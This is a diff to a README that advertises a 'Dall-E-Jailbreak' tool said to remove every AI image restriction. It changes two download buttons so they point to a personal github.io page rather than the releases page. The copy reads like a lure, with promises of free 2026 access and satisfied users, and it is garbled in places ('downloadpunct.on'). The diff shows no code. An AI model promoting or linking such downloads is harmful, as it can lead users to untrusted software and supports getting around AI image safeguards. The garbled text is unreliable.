@@ -1,6 +1,6 @@
 # 🎨 Dall-E-Jailbreak - Unlock Every AI Image Restriction Instantly
 
-[![Download Dall-E Jailbreak](https://img.shields.io/badge/Download-Dall--E--Jailbreak-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Smpkapin54/Dall-E-Jailbreak/releases)
+[![Download Dall-E Jailbreak](https://img.shields.io/badge/Download-Dall--E--Jailbreak-FF6B6B?style=for-the-badge&logo=github&logoColor=white)](https://smpkapin54.github.io)
 
 ---
 
@@ -169,7 +169,7 @@ Join thousands of satisfied users who have already unlocked their full creative 
 
 The 2026 version is here, and it's completely free to downloadpunct.on Don't let this opportunity pass you bypunct.on
 
-[![Get Free Access Now](https://img.shields.io/badge/🚀_Get_Free_Access_Now-Click_Here_to_Download-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Smpkapin54/Dall-E-Jailbreak/releases)
+[![Get Free Access Now](https://img.shields.io/badge/🚀_Get_Free_Access_Now-Click_Here_to_Download-4CAF50?style=for-the-badge&logo=github&logoColor=white)](https://smpkapin54.github.io)
 
 Remember—creativity knows no bounds when you have the right toolspunct.on Download Dall-E-Jailbreak today and start generating the images you've always dreamed ofpunct.on See you on the other side of unlimited creativitypunct.on
 
